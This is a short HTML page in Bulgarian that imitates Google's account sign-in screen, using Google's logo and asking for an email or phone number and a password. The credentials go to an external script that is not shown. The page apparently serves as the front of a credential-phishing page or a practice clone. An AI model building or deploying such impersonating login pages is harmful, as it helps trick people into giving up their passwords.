<!DOCTYPE html>
<html lang="bg">
<head>
  <meta charset="UTF-8">
  <title>Вход в Google акаунт</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="login-container">
    <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google Logo" class="logo">
    <h2>Вход</h2>
    <form id="loginForm">
      <input type="email" id="email" placeholder="Имейл или телефонен номер" required>
      <input type="password" id="password" placeholder="Въведете паролата си" required>
      <button type="submit">Напред</button>
      <p id="errorMessage" class="error"></p>
    </form>
  </div>
  <script src="script.js"></script>
</body>
</html>
